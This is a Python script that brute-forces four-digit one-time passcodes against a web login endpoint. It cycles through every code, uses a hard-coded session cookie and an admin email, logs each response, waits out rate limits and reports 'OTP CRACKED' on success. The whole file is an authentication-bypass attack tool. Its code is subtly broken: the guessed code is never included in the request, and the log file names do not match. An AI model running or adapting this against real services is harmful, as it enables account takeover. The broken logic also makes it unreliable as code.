import datetime
import json
from time import sleep
from requests import post
from colorama import Fore


def try_otp(num):
    url = 'https://domain.com'
    headers = {
        'Cookie': 'JSESSIONID=qwerty',
        'Content-type': 'application/json',
        'Accept': 'application/json'
    }
    payload = json.dumps({
        "email": "admin@admin.com",
        "mobilePhone": "+7(777)777-77-77"
        })
    req = post(url, payload, headers=headers)
    file = open('logs_11_08.txt', 'a')
    file.write(f"Response to {num} - {req.status_code} {req.reason}\n\n")
    file.write(f"{req.text}\n\n")
    file.close()
    if req.status_code == 429:
        return "429"
    if "Неверный код подтверждения" not in req.text:
        return "ok"
    return False


def main():
    file = open('logs.txt', 'w')
    file.close()
    i = 1
    while i < 10000:
        num = str(i).zfill(4)
        try:
            result = try_otp(num)
            dt_now = datetime.datetime.now()
            if result == "ok":
                print(Fore.GREEN + f"[+] {dt_now} - OTP CRACKED: {num}")
                break
            elif result == "429":
                print(Fore.RED + f"[X] {dt_now} - Too many requests, retry...")
            else:
                print(Fore.RED + f"[-] {dt_now} - OTP invalid: {num}")
                i += 1
            sleep(5)
        except Exception as e:
            print(e)


if __name__ == '__main__':
    main()
